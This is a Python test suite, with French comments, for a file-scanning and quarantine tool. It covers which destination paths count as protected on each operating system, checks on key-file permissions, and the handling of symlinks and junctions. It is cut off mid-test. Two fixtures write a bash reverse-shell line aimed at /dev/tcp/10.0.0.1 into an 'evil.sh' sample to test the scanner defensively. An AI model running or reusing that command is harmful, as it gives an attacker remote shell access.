"""Parité Windows / macOS des contrôles qui étaient silencieux hors Linux.

La décision (listes, casse, ACL) est testée partout. Les effets réels
(jonction, DACL, mode) ne sont sautés que lorsque l'OS ne peut pas les
produire.
"""

from __future__ import annotations

import hashlib
import os
import stat
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from sentinel.integrity import diff_against_baseline, make_baseline  # noqa: E402
from sentinel.keys import KeySourceError, read_key_file  # noqa: E402
from sentinel.platform import (  # noqa: E402
    classify_dest_text,
    describe_key_acl,
    is_link,
    live_dest_class,
    path_exists_strict,
    path_is_within,
    source_class,
)
from sentinel.quarantine import quarantine_paths  # noqa: E402
from sentinel.scanner import OperationCancelled, scan_folder  # noqa: E402


class TestDestLists(unittest.TestCase):
    def test_windows_hard_and_soft_are_case_insensitive(self) -> None:
        home = r"C:\Users\alice"
        extras = {
            "APPDATA": r"C:\Users\alice\AppData\Roaming",
            "LOCALAPPDATA": r"C:\Users\alice\AppData\Local",
            "SystemRoot": r"C:\Windows",
            "ProgramFiles": r"C:\Program Files",
            "ProgramFiles(x86)": r"C:\Program Files (x86)",
            "ProgramData": r"C:\ProgramData",
        }
        kwargs = {"os_name": "nt", "platform": "win32", "home": home, "extras": extras}
        self.assertEqual(classify_dest_text(r"C:\Users\alice", **kwargs), "hard")
        self.assertEqual(classify_dest_text(r"c:\users\alice\.ssh\keys", **kwargs), "hard")
        self.assertEqual(classify_dest_text(r"C:\Users\alice\.gnupg\q", **kwargs), "hard")
        self.assertEqual(classify_dest_text("C:\\", **kwargs), "hard")
        self.assertEqual(classify_dest_text("D:\\", **kwargs), "hard")
        self.assertEqual(
            classify_dest_text(r"c:\users\alice\appdata\roaming\sentinel", **kwargs),
            "soft",
        )
        self.assertEqual(classify_dest_text(r"C:\WINDOWS\System32\q", **kwargs), "soft")
        self.assertEqual(classify_dest_text(r"C:\Program Files\Sentinel", **kwargs), "soft")
        self.assertEqual(classify_dest_text(r"C:\Program Files (x86)\Foo", **kwargs), "soft")
        self.assertEqual(classify_dest_text(r"C:\ProgramData\sentinel", **kwargs), "soft")
        self.assertEqual(
            classify_dest_text(r"C:\Users\alice\Projects\q", **kwargs),
            "allow",
        )
        self.assertEqual(
            classify_dest_text(r"C:\Users\alice\.sentinel-quarantine", **kwargs),
            "allow",
        )
        temp = r"C:\Users\alice\AppData\Local\Temp"
        self.assertEqual(
            classify_dest_text(temp + r"\q-work", **kwargs, temp=temp),
            "allow",
        )
        nested = {
            **kwargs,
            "home": temp + r"\home",
        }
        self.assertEqual(
            classify_dest_text(temp + r"\home\.ssh\id", **nested, temp=temp),
            "hard",
        )
        self.assertEqual(
            classify_dest_text(temp + r"\home\.config\q", **nested, temp=temp),
            "soft",
        )
        # Un %APPDATA% niché dans le temporaire (profil de test) reste
        # souple. Le temporaire réel, lui, est sous LOCALAPPDATA qui
        # contient ce dossier : il reste autorisé.
        runner_temp = r"C:\Users\RUNNER\AppData\Local\Temp\sentinelxyz"
        profile = runner_temp + r"\Profile"
        fake = {
            **extras,
            "APPDATA": profile + r"\AppData\Roaming",
            "LOCALAPPDATA": r"C:\Users\RUNNER\AppData\Local",
        }
        fake_kwargs = {**kwargs, "home": profile, "extras": fake}
        self.assertEqual(
            classify_dest_text(profile + r"\AppData\Roaming\q", **fake_kwargs, temp=runner_temp),
            "soft",
        )
        self.assertEqual(
            classify_dest_text(runner_temp + r"\q-work", **fake_kwargs, temp=runner_temp),
            "allow",
        )

    def test_macos_keychains_and_system_and_case(self) -> None:
        home = "/Users/alice"
        kwargs = {"os_name": "posix", "platform": "darwin", "home": home, "extras": {}}
        self.assertEqual(classify_dest_text("/Users/alice", **kwargs), "hard")
        self.assertEqual(
            classify_dest_text("/users/alice/library/keychains/login", **kwargs),
            "hard",
        )
        self.assertEqual(classify_dest_text("/Users/alice/.SSH/id_ed25519", **kwargs), "hard")
        self.assertEqual(classify_dest_text("/Users/alice/.config/sentinel", **kwargs), "soft")
        self.assertEqual(classify_dest_text("/Users/alice/Library/Caches/q", **kwargs), "soft")
        self.assertEqual(classify_dest_text("/System/Library/q", **kwargs), "soft")
        self.assertEqual(classify_dest_text("/Applications/Foo.app", **kwargs), "soft")
        self.assertEqual(classify_dest_text("/Library/LaunchDaemons", **kwargs), "soft")
        self.assertEqual(classify_dest_text("/tmp/q-not-sensitive", **kwargs), "allow")
        temp = "/private/var/folders/xx/T"
        self.assertEqual(
            classify_dest_text(temp + "/q-work", **kwargs, temp=temp),
            "allow",
        )
        self.assertEqual(
            classify_dest_text("/private/var/db/sentinel", **kwargs, temp=temp), "soft"
        )
        nested = {**kwargs, "home": temp + "/home"}
        self.assertEqual(
            classify_dest_text(temp + "/home/.ssh/id", **nested, temp=temp),
            "hard",
        )
        self.assertEqual(
            classify_dest_text(temp + "/home/.config/q", **nested, temp=temp),
            "soft",
        )

    def test_linux_stays_case_sensitive_and_ignores_macos_names(self) -> None:
        home = "/home/alice"
        kwargs = {"os_name": "posix", "platform": "linux", "home": home, "extras": {}}
        self.assertEqual(classify_dest_text("/home/alice/.ssh/q", **kwargs), "hard")
        self.assertEqual(classify_dest_text("/home/alice/.SSH/q", **kwargs), "allow")
        self.assertEqual(classify_dest_text("/home/alice/Library/Keychains", **kwargs), "allow")
        self.assertEqual(classify_dest_text("/etc/sentinel", **kwargs), "soft")
        self.assertEqual(classify_dest_text("/", **kwargs), "hard")

    def test_home_under_system_prefix_does_not_swallow_the_account(self) -> None:
        kwargs = {
            "os_name": "posix",
            "platform": "linux",
            "home": "/var/home/alice",
            "extras": {},
        }
        self.assertEqual(classify_dest_text("/var/home/alice/work", **kwargs), "allow")
        self.assertEqual(classify_dest_text("/var", **kwargs), "soft")
        # HOME est sous /var : le reste du préfixe n'est pas marqué soft
        # (même règle que l'ancien garde-fou). /etc, lui, le reste.
        self.assertEqual(classify_dest_text("/var/log", **kwargs), "allow")
        self.assertEqual(classify_dest_text("/etc/sentinel", **kwargs), "soft")


class TestLivePolicy(unittest.TestCase):
    def test_fake_home_ssh_is_hard_on_this_os(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            home = Path(td) / "Home"
            home.mkdir()
            dest = home / ".ssh" / "q"
            env = {**os.environ, "HOME": str(home), "USERPROFILE": str(home)}
            old = os.environ.copy()
            os.environ.update(env)
            try:
                self.assertEqual(live_dest_class(dest), "hard")
                if sys.platform == "darwin" or os.name == "nt":
                    mixed = home / ".SSH" / "Q"
                    self.assertEqual(live_dest_class(mixed), "hard")
                else:
                    self.assertEqual(live_dest_class(home / ".SSH" / "q"), "allow")
            finally:
                os.environ.clear()
                os.environ.update(old)

    @unittest.skipUnless(sys.platform == "darwin", "chemins macOS réels")
    def test_macos_keychains_live(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            home = Path(td) / "Home"
            dest = home / "Library" / "Keychains" / "login.keychain-db"
            old = os.environ.get("HOME")
            os.environ["HOME"] = str(home)
            try:
                self.assertEqual(live_dest_class(dest), "hard")
                self.assertEqual(live_dest_class(Path("/System/Library")), "soft")
            finally:
                if old is None:
                    os.environ.pop("HOME", None)
                else:
                    os.environ["HOME"] = old

    @unittest.skipUnless(os.name == "nt", "chemins Windows réels")
    def test_windows_profile_and_drive_root_live(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            home = Path(td) / "Profile"
            home.mkdir()
            old_profile = os.environ.get("USERPROFILE")
            old_home = os.environ.get("HOME")
            old_app = os.environ.get("APPDATA")
            win_key = "SYSTEMROOT"
            old_win = os.environ.get(win_key)
            os.environ["USERPROFILE"] = str(home)
            os.environ["HOME"] = str(home)
            appdata = home / "AppData" / "Roaming"
            os.environ["APPDATA"] = str(appdata)
            os.environ[win_key] = os.environ.get(win_key, r"C:\Windows")
            try:
                self.assertEqual(live_dest_class(home), "hard")
                self.assertEqual(live_dest_class(home / ".ssh" / "id"), "hard")
                self.assertEqual(live_dest_class(appdata / "q"), "soft")
                self.assertEqual(live_dest_class(Path(os.environ[win_key]) / "Temp"), "soft")
                anchor = Path(home).anchor or Path.cwd().anchor
                self.assertEqual(live_dest_class(Path(anchor)), "hard")
            finally:
                for key, value in (
                    ("USERPROFILE", old_profile),
                    ("HOME", old_home),
                    ("APPDATA", old_app),
                    (win_key, old_win),
                ):
                    if value is None:
                        os.environ.pop(key, None)
                    else:
                        os.environ[key] = value


class TestKeyAclDecision(unittest.TestCase):
    def test_foreign_read_is_refused_and_privileged_sids_pass(self) -> None:
        user = "S-1-5-21-1"
        problem = describe_key_acl(
            [(0, 0x120089, "S-1-1-0")],
            user_sid=user,
            null_dacl=False,
        )
        self.assertIsNotNone(problem)
        assert problem is not None
        self.assertIn("lisible", problem)
        ok = describe_key_acl(
            [
                (0, 0x1F01FF, user),
                (0, 0x120089, "S-1-5-18"),
                (0, 0x120089, "S-1-5-32-544"),
            ],
            user_sid=user,
            null_dacl=False,
        )
        self.assertIsNone(ok)
        self.assertIsNotNone(describe_key_acl([], user_sid=user, null_dacl=True))
        unknown = describe_key_acl([(5, 0x120089, user)], user_sid=user, null_dacl=False)
        self.assertIsNotNone(unknown)

    def test_posix_mode_still_refuses_group_read(self) -> None:
        if os.name == "nt":
            self.skipTest("le contrôle de mode Unix n'est pas celui de Windows")
        with tempfile.TemporaryDirectory() as td:
            path = Path(td) / "k"
            path.write_text("secret\n")
            path.chmod(0o640)
            with self.assertRaises(KeySourceError) as caught:
                read_key_file(path)
            self.assertIn("lisible", str(caught.exception))
            path.chmod(0o600)
            self.assertEqual(read_key_file(path), "secret")

    @unittest.skipUnless(os.name == "nt", "ACL Windows")
    def test_windows_key_file_acl(self) -> None:
        from sentinel.platform import expose_key_file, restrict_key_file

        with tempfile.TemporaryDirectory() as td:
            path = Path(td) / "k"
            path.write_text("secret\n")
            restrict_key_file(path)
            self.assertEqual(read_key_file(path), "secret")
            expose_key_file(path)
            with self.assertRaises(KeySourceError) as caught:
                read_key_file(path)
            self.assertIn("lisible", str(caught.exception))


class TestReparse(unittest.TestCase):
    def test_symlink_is_a_link_and_regular_file_is_not(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            target = root / "target.txt"
            target.write_text("ok\n")
            link = root / "link"
            try:
                link.symlink_to(target)
            except OSError as exc:
                self.skipTest(f"symlinks indisponibles : {exc}")
            self.assertTrue(is_link(link))
            self.assertFalse(is_link(target))

    def test_scan_does_not_follow_a_link_outside_the_tree(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            outside = root / "outside"
            outside.mkdir()
            (outside / "evil.sh").write_text("bash -i >& /dev/tcp/10.0.0.1/9 0>&1\n")
            inside = root / "inside"
            inside.mkdir()
            link = inside / "via"
            try:
                link.symlink_to(outside / "evil.sh")
            except OSError as exc:
                self.skipTest(f"symlinks indisponibles : {exc}")
            report = scan_folder(inside)
            self.assertEqual(report.findings, [])

    @unittest.skipUnless(os.name == "nt", "jonctions Windows")
    def test_junction_is_not_followed_by_scan_or_quarantine(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            outside = root / "outside"
            outside.mkdir()
            payload = outside / "evil.sh"
            payload.write_text("bash -i >& /dev/tcp/10.0.0.1/9 0>&1\n")
            inside = root / "inside"
            inside.mkdir()
            junction = inside / "jump"
            created = subprocess.run(
                ["cmd", "/c", "mklink", "/J", str(junction), str(outside)],
                capture_output=True,
                text=True,
            )
            if created.returncode != 0:
                self.skipTest(created.stderr or created.stdout)
            self.assertTrue(is_link(junction))
            report = scan_folder(inside)
            self.assertEqual(report.findings, [])
            before = payload.read_text()
            before_mode = payload.stat().st_mode
            dest = root / "q"
            records, failures = quarantine_paths([junction], dest, dest / "manifest.jsonl")
            self.assertEqual(failures, [], failures)
            self.assertNotEqual(
                records[0].sha256,
                hashlib.sha256(before.encode()).hexdigest(),
            )
            self.assertEqual(payload.read_text(), before)
            self.assertEqual(payload.stat().st_mode, before_mode)
            self.assertFalse(junction.exists())


class TestQuarantineModes(unittest.TestCase):
    def test_quarantine_clears_owner_write(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            src = root / "evil.sh"
            src.write_text("echo\n")
            dest = Path(tempfile.mkdtemp(prefix="q-"))
            records, failures = quarantine_paths([src], dest, dest / "manifest.jsonl")
            self.assertEqual(failures, [], failures)
            stored = Path(records[0].quarantined)
            self.assertFalse(stored.stat().st_mode & stat.S_IWUSR)

    @unittest.skipUnless(os.name == "nt", "attribut et ACL Windows")
    def test_windows_readonly_acl_has_no_user_write_data(self) -> None:
        from sentinel._winapi import current_user_sid, read_dacl

        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            src = root / "evil.sh"
            src.write_text("echo\n")
            dest = Path(tempfile.mkdtemp(prefix="q-"))
            records, _failures = quarantine_paths([src], dest, dest / "manifest.jsonl")
            stored = Path(records[0].quarantined)
            user = current_user_sid()
            aces, null_dacl = read_dacl(stored)
            self.assertFalse(null_dacl)
            file_write = 0x0002
            admins = "S-1-5-32-544"
            saw_deny = False
            for ace_type, mask, sid in aces:
                if ace_type == 0:
                    self.assertFalse(mask & file_write, sid)
                if ace_type == 1 and mask & file_write:
                    saw_deny = True
                if sid == admins and ace_type == 0:
                    self.assertFalse(mask & file_write)
            self.assertTrue(saw_deny)
            self.assertTrue(any(sid == user and ace_type == 0 for ace_type, _mask, sid in aces))
            # L'attribut lecture seule bloque DeleteFile. Une fois retiré,
            # l'ACL refuse encore l'écriture (pas de FILE_WRITE_DATA) mais
            # DELETE permet de supprimer, comme unlink d'un 0444 sur POSIX.
            os.chmod(stored, stat.S_IWRITE)
            with self.assertRaises(PermissionError):
                stored.write_bytes(b"nope\n")
            stored.unlink()
            self.assertFalse(stored.exists())


class TestOwnerSid(unittest.TestCase):
    def test_sid_difference_is_an_owner_change(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            (root / "a.txt").write_text("a\n")
            current = make_baseline(root)
            entry = dict(current["entries"][0])
            entry["owner"] = "S-1-5-21-1"
            other = dict(entry)
            other["owner"] = "S-1-5-21-2"
            diff = diff_against_baseline(
                {"version": 2, "root": str(root), "entries": [entry]},
                {"version": 2, "root": str(root), "entries": [other]},
            )
            self.assertIn("a.txt", diff.owner_changed)

    def test_missing_owner_is_not_a_false_change(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            (root / "a.txt").write_text("a\n")
            current = make_baseline(root)
            entry = dict(current["entries"][0])
            entry["owner"] = None
            other = dict(entry)
            other.pop("owner", None)
            diff = diff_against_baseline(
                {"version": 2, "root": str(root), "entries": [entry]},
                {"version": 2, "root": str(root), "entries": [other]},
            )
            self.assertEqual(diff.owner_changed, [])


class TestCancel(unittest.TestCase):
    def test_scan_cancel_stops(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            (root / "a.txt").write_text("a\n")
            (root / "b.txt").write_text("b\n")
            calls = {"n": 0}

            def cancel() -> bool:
                calls["n"] += 1
                return calls["n"] > 1

            with self.assertRaises(OperationCancelled):
                scan_folder(root, cancel=cancel)


class TestCoreDoesNotImportGui(unittest.TestCase):
    def test_engine_import_does_not_pull_pyside(self) -> None:
        # Interpréteur neuf : les autres modules de test importent
        # ``sentinel.gui`` (services, sans Qt) et fausseraient le constat.
        code = (
            "import sentinel.integrity, sentinel.keys, sentinel.quarantine, sentinel.scanner, sys\n"
            "assert 'sentinel.gui' not in sys.modules, sorted(sys.modules)\n"
            "assert not [n for n in sys.modules if n == 'PySide6' or n.startswith('PySide6.')]\n"
        )
        env = os.environ.copy()
        env["PYTHONPATH"] = str(ROOT) + os.pathsep + env.get("PYTHONPATH", "")
        proc = subprocess.run(
            [sys.executable, "-c", code],
            cwd=str(ROOT),
            capture_output=True,
            text=True,
            check=False,
            env=env,
        )
        self.assertEqual(proc.returncode, 0, proc.stderr)


class TestTempException(unittest.TestCase):
    """TMPDIR ne doit jamais affaiblir une liste dure ou souple.

    L'exemption ne vaut que pour un dossier résolu qui est *dans* un
    temporaire connu du système, et jamais pour cette racine elle-même.
    """

    def setUp(self) -> None:
        self._saved = {
            key: os.environ.get(key)
            for key in ("TMPDIR", "TEMP", "TMP", "HOME", "USERPROFILE", "APPDATA")
        }

    def tearDown(self) -> None:
        for key, value in self._saved.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value

    def test_component_boundary_and_dotdot(self) -> None:
        self.assertFalse(path_is_within("/tmpfoo", "/tmp", os_name="posix", fold=False))
        self.assertFalse(path_is_within("/tmpfoo/q", "/tmp", os_name="posix", fold=False))
        self.assertTrue(path_is_within("/tmp/foo", "/tmp", os_name="posix", fold=False))
        self.assertFalse(path_is_within("/tmp/../etc", "/tmp", os_name="posix", fold=False))
        self.assertTrue(path_is_within("/tmp/../etc/passwd", "/etc", os_name="posix", fold=False))
        self.assertFalse(
            path_is_within(
                r"C:\Windows\TempFoo\q",
                r"C:\Windows\Temp",
                os_name="nt",
                fold=True,
            )
        )
        self.assertFalse(
            path_is_within(
                r"C:\Windows\Temp\..\System32",
                r"C:\Windows\Temp",
                os_name="nt",
                fold=True,
            )
        )

    def test_linux_tmpdir_inside_a_deny_zone_grants_nothing(self) -> None:
        kwargs = {
            "os_name": "posix",
            "platform": "linux",
            "home": "/home/alice",
            "extras": {},
        }
        cases = {
            "/home/alice/.config/x/q": ("/home/alice/.config/x", "soft"),
            "/home/alice/.ssh/id": ("/home/alice/.ssh", "hard"),
            "/home/alice/.gnupg/q": ("/home/alice/.gnupg", "hard"),
            "/etc/sentinel": ("/etc", "soft"),
            "/etc/x/f": ("/etc/x", "soft"),
            "/home/alice": ("/home/alice", "hard"),
            "/home/alice/.config/q": ("/home/alice", "soft"),
            "/": ("/", "hard"),
            "/etc/sentinel-from-root": ("/", "soft"),
            "/tmp/../etc/passwd": ("/tmp", "soft"),
            "/tmp/foo/../../etc/sentinel": ("/tmp", "soft"),
            "/etc/from-dotdot": ("/tmp/../etc", "soft"),
            "/tmp": ("/tmp", "soft"),
            "/var/tmp": ("/var/tmp", "soft"),
            "/var/tmpfoo/q": ("/var/tmp", "soft"),
            # Dossier ordinaire : la racine TMPDIR est souple, pas son contenu.
            "/home/alice/work": ("/home/alice/work", "soft"),
            "/home/alice/work/f": ("/home/alice/work", "allow"),
            "/home/alice/proj": ("/home/alice/proj/sub", "soft"),
            "/home/alice/proj/sub": ("/home/alice/proj/sub", "soft"),
            "/home/alice/proj/sub/f": ("/home/alice/proj/sub", "allow"),
            "/home/alice/proj/other": ("/home/alice/proj/sub", "allow"),
            # Ancêtre dans la racine /tmp : souple, pas seulement hors /tmp.
            "/tmp/foo": ("/tmp/foo/sub", "soft"),
            "/tmp/custom": ("/tmp/custom", "soft"),
            "/tmp/custom/f": ("/tmp/custom", "allow"),
        }
        for dest, (temp, expected) in cases.items():
            with self.subTest(dest=dest, temp=temp):
                self.assertEqual(
                    classify_dest_text(dest, **kwargs, temp=temp),
                    expected,
                )
        self.assertEqual(
            classify_dest_text("/tmp/q-work", **kwargs, temp="/tmp"),
            "allow",
        )
        self.assertEqual(
            classify_dest_text("/var/tmp/q-work", **kwargs, temp="/var/tmp"),
            "allow",
        )
        # Un nom qui commence comme la racine n'hérite pas de l'exemption.
        self.assertEqual(
            classify_dest_text("/tmpfoo/q", **kwargs, temp="/tmp"),
            "allow",
        )
        # /tmp reste protégé même si TMPDIR vise ailleurs.
        self.assertEqual(
            classify_dest_text("/tmp", **kwargs, temp="/home/alice/work"),
            "soft",
        )
        self.assertEqual(
            classify_dest_text("/tmp/foo", **kwargs, temp="/home/alice/work"),
            "allow",
        )
        # TMPDIR=/tmp/x/sub : /tmp/x et /tmp sont souples, le contenu non,
        # un frère sous /tmp reste autorisé.
        self.assertEqual(classify_dest_text("/tmp/x", **kwargs, temp="/tmp/x/sub"), "soft")
        self.assertEqual(classify_dest_text("/tmp", **kwargs, temp="/tmp/x/sub"), "soft")
        self.assertEqual(classify_dest_text("/tmp/x/sub", **kwargs, temp="/tmp/x/sub"), "soft")
        self.assertEqual(classify_dest_text("/tmp/x/sub/f", **kwargs, temp="/tmp/x/sub"), "allow")
        self.assertEqual(classify_dest_text("/tmp/y", **kwargs, temp="/tmp/x/sub"), "allow")

    def test_macos_tmpdir_inside_a_deny_zone_grants_nothing(self) -> None:
        home = "/Users/alice"
        kwargs = {"os_name": "posix", "platform": "darwin", "home": home, "extras": {}}
        cases = {
            home + "/.config/x/q": (home + "/.config/x", "soft"),
            home + "/.SSH/id": (home + "/.ssh", "hard"),
            home + "/.gnupg/q": (home + "/.gnupg", "hard"),
            home + "/Library/Keychains/login": (home + "/Library/Keychains", "hard"),
            home + "/Library/Caches/q": (home + "/Library/Caches", "soft"),
            "/etc/sentinel": ("/etc", "soft"),
            "/System/Library/q": ("/System", "soft"),
            "/Library/x/f": ("/Library/x", "soft"),
            "/private/etc/passwd": ("/private/etc", "soft"),
            home: (home, "hard"),
            "/": ("/", "hard"),
            "/private/tmp": ("/private/tmp", "soft"),
            "/private/var/folders": ("/private/var/folders", "soft"),
            "/private/var/folders/xx/T": ("/private/var/folders/xx/T", "soft"),
            "/private/var/foldersfoo/q": ("/private/var/folders", "soft"),
            "/tmp/../etc/sentinel": ("/tmp", "soft"),
            home + "/work": (home + "/work", "soft"),
            home + "/work/f": (home + "/work", "allow"),
            "/tmp/custom": ("/tmp/custom", "soft"),
            "/tmp/custom/f": ("/tmp/custom", "allow"),
        }
        for dest, (temp, expected) in cases.items():
            with self.subTest(dest=dest, temp=temp):
                self.assertEqual(classify_dest_text(dest, **kwargs, temp=temp), expected)
        self.assertEqual(
            classify_dest_text("/private/tmp/q-work", **kwargs, temp="/private/tmp"),
            "allow",
        )
        self.assertEqual(
            classify_dest_text(
                "/private/var/folders/xx/T/q-work",
                **kwargs,
                temp="/private/var/folders/xx/T",
            ),
            "allow",
        )
        self.assertFalse(
            path_is_within("/private/tmpfoo", "/private/tmp", os_name="posix", fold=True)
        )
        # Jusqu'à la racine temporaire, pas au-dessus (/private reste allow).
        self.assertEqual(
            classify_dest_text("/private/tmp/x", **kwargs, temp="/private/tmp/x/sub"),
            "soft",
        )
        self.assertEqual(
            classify_dest_text("/private/tmp", **kwargs, temp="/private/tmp/x/sub"),
            "soft",
        )
        self.assertEqual(
            classify_dest_text("/private/tmp/x/sub/f", **kwargs, temp="/private/tmp/x/sub"),
            "allow",
        )
        self.assertEqual(
            classify_dest_text("/private", **kwargs, temp="/private/tmp/x/sub"),
            "allow",
        )

    def test_windows_tmpdir_inside_a_deny_zone_grants_nothing(self) -> None:
        home = r"C:\Users\alice"
        extras = {
            "APPDATA": home + r"\AppData\Roaming",
            "LOCALAPPDATA": home + r"\AppData\Local",
            "SystemRoot": r"C:\Windows",
            "ProgramFiles": r"C:\Program Files",
            "ProgramFiles(x86)": r"C:\Program Files (x86)",
            "ProgramData": r"C:\ProgramData",
        }
        kwargs = {"os_name": "nt", "platform": "win32", "home": home, "extras": extras}
        local_temp = extras["LOCALAPPDATA"] + r"\Temp"
        win_temp = r"C:\Windows\Temp"
        cases = {
            extras["APPDATA"] + r"\x\q": (extras["APPDATA"] + r"\x", "soft"),
            extras["APPDATA"] + r"\x\f": (extras["APPDATA"] + r"\x", "soft"),
            home + r"\.ssh\id": (home + r"\.ssh", "hard"),
            home + r"\.gnupg\q": (home + r"\.gnupg", "hard"),
            home + r"\.config\q": (home + r"\.config", "soft"),
            r"C:\Windows\System32\q": (r"C:\Windows\System32", "soft"),
            r"C:\Program Files\Foo\q": (r"C:\Program Files\Foo", "soft"),
            home: (home, "hard"),
            "C:\\": ("C:\\", "hard"),
            r"C:\Windows\System32\from-root": ("C:\\", "soft"),
            local_temp: (local_temp, "soft"),
            win_temp: (win_temp, "soft"),
            local_temp + r"\..\..\Roaming\q": (local_temp, "soft"),
            r"C:\Windows\TempFoo\q": (win_temp, "soft"),
            r"C:\Windows\Temp\..\System32\q": (win_temp, "soft"),
            home + r"\Projects": (home + r"\Projects", "soft"),
            home + r"\Projects\q": (home + r"\Projects", "allow"),
            local_temp + r"\sub": (local_temp + r"\sub", "soft"),
            local_temp + r"\sub\q": (local_temp + r"\sub", "allow"),
        }
        for dest, (temp, expected) in cases.items():
            with self.subTest(dest=dest, temp=temp):
                self.assertEqual(classify_dest_text(dest, **kwargs, temp=temp), expected)
        self.assertEqual(
            classify_dest_text(local_temp + r"\q-work", **kwargs, temp=local_temp),
            "allow",
        )
        self.assertEqual(
            classify_dest_text(win_temp + r"\q-work", **kwargs, temp=win_temp),
            "allow",
        )
        self.assertEqual(
            classify_dest_text(r"c:\windows\temp\q-work", **kwargs, temp=win_temp),
            "allow",
        )
        nested = local_temp + r"\x\sub"
        self.assertEqual(classify_dest_text(local_temp + r"\x", **kwargs, temp=nested), "soft")
        self.assertEqual(classify_dest_text(local_temp, **kwargs, temp=nested), "soft")
        self.assertEqual(classify_dest_text(nested + r"\f", **kwargs, temp=nested), "allow")

    def test_live_deny_zones_and_temp_root(self) -> None:
        src_dir = Path(tempfile.mkdtemp(prefix="sentinel-src-"))
        src = src_dir / "evil.sh"
        src.write_text("echo\n")
        try:
            if os.name == "nt":
                windir = os.environ.get("SYSTEMROOT", r"C:\Windows")
                os.environ["TMPDIR"] = windir
                self.assertEqual(live_dest_class(Path(windir) / "System32"), "soft")
                local = os.environ.get("LOCALAPPDATA", "")
                self.assertEqual(live_dest_class(Path(local) / "Temp"), "soft")
                root = Path(src).anchor
                self.assertEqual(live_dest_class(Path(root)), "hard")
            else:
                os.environ["TMPDIR"] = "/etc"
                self.assertEqual(live_dest_class(Path("/etc/sentinel-not-real")), "soft")
                records, failures = quarantine_paths(
                    [src],
                    Path("/etc/sentinel-not-real"),
                    Path("/etc/sentinel-not-real/manifest.jsonl"),
                )
                self.assertEqual(records, [])
                self.assertIn("sensible", failures[0][1])
                self.assertTrue(src.exists())

                os.environ["TMPDIR"] = "/"
                self.assertEqual(live_dest_class(Path("/")), "hard")
                records, failures = quarantine_paths(
                    [src],
                    Path("/"),
                    Path("/manifest.jsonl"),
                )
                self.assertEqual(records, [])
                self.assertIn("critique", failures[0][1])
                self.assertTrue(src.exists())

                os.environ["TMPDIR"] = "/tmp/../etc"
                self.assertEqual(live_dest_class(Path("/etc/from-dotdot")), "soft")
                self.assertEqual(live_dest_class(Path("/tmp/foo/../../etc")), "soft")
                self.assertEqual(live_dest_class(Path("/tmp")), "soft")
                self.assertEqual(live_dest_class(Path("/var/tmp")), "soft")
                records, failures = quarantine_paths(
                    [src],
                    Path("/tmp"),
                    Path("/tmp/sentinel-manifest-should-not.jsonl"),
                )
                self.assertEqual(records, [])
                self.assertTrue(src.exists())
                self.assertFalse(Path("/tmp/sentinel-manifest-should-not.jsonl").exists())
        finally:
            src.unlink(missing_ok=True)
            src_dir.rmdir()

    def test_live_symlink_or_junction_to_ssh_is_hard(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            home = root / "home"
            ssh = home / ".ssh"
            ssh.mkdir(parents=True)
            os.environ["HOME"] = str(home)
            os.environ["USERPROFILE"] = str(home)
            link = root / "to-ssh"
            if os.name == "nt":
                created = subprocess.run(
                    ["cmd", "/c", "mklink", "/J", str(link), str(ssh)],
                    capture_output=True,
                    text=True,
                )
                if created.returncode != 0:
                    self.skipTest(created.stderr or created.stdout)
            else:
                try:
                    link.symlink_to(ssh, target_is_directory=True)
                except OSError as exc:
                    self.skipTest(str(exc))
            os.environ["TMPDIR"] = str(link)
            self.assertEqual(live_dest_class(link), "hard")
            self.assertEqual(live_dest_class(link / "id_ed25519"), "hard")
            src = root / "evil.sh"
            src.write_text("echo\n")
            records, failures = quarantine_paths([src], link, link / "manifest.jsonl")
            self.assertEqual(records, [])
            self.assertIn("critique", failures[0][1])
            self.assertTrue(src.exists())
            self.assertFalse((link / "manifest.jsonl").exists())

    def test_live_tmpdir_config_outside_platform_temp_stays_soft(self) -> None:
        # Hors de /tmp : si l'exemption faisait confiance à TMPDIR brut,
        # ce dossier passerait en allow.
        base = Path(ROOT) / ".sentinel-tmpdir-probe"
        home = base / "home"
        config = home / ".config" / "x"
        gnupg = home / ".gnupg"
        try:
            config.mkdir(parents=True)
            gnupg.mkdir()
            os.environ["HOME"] = str(home)
            os.environ["USERPROFILE"] = str(home)
            os.environ["TMPDIR"] = str(config)
            self.assertEqual(live_dest_class(config / "q"), "soft")
            os.environ["TMPDIR"] = str(gnupg)
            self.assertEqual(live_dest_class(gnupg / "q"), "hard")
            os.environ["TMPDIR"] = str(home)
            self.assertEqual(live_dest_class(home), "hard")
            if sys.platform == "darwin":
                keys = home / "Library" / "Keychains"
                keys.mkdir(parents=True)
                os.environ["TMPDIR"] = str(keys)
                self.assertEqual(live_dest_class(keys / "login"), "hard")
            if os.name == "nt":
                app = home / "AppData" / "Roaming"
                app.mkdir(parents=True)
                os.environ["APPDATA"] = str(app)
                os.environ["TMPDIR"] = str(app)
                self.assertEqual(live_dest_class(app / "q"), "soft")
        finally:
            import shutil

            shutil.rmtree(base, ignore_errors=True)

    def test_reported_holes_do_not_move_the_file(self) -> None:
        """TMPDIR=/etc/x, TEMP=%APPDATA%\\x et /Library/x ne déplacent rien."""
        src_dir = Path(tempfile.mkdtemp(prefix="sentinel-src-"))
        src = src_dir / "f"
        src.write_text("secret\n")
        try:
            if os.name == "nt":
                app = Path(os.environ["APPDATA"]) / "sentinel-x-probe"
                app.mkdir(exist_ok=True)
                os.environ.pop("TMPDIR", None)
                os.environ["TEMP"] = str(app)
                os.environ["TMP"] = str(app)
                dest = app / "f"
                self.assertEqual(live_dest_class(dest), "soft")
            elif sys.platform == "darwin":
                os.environ["TMPDIR"] = "/Library/x"
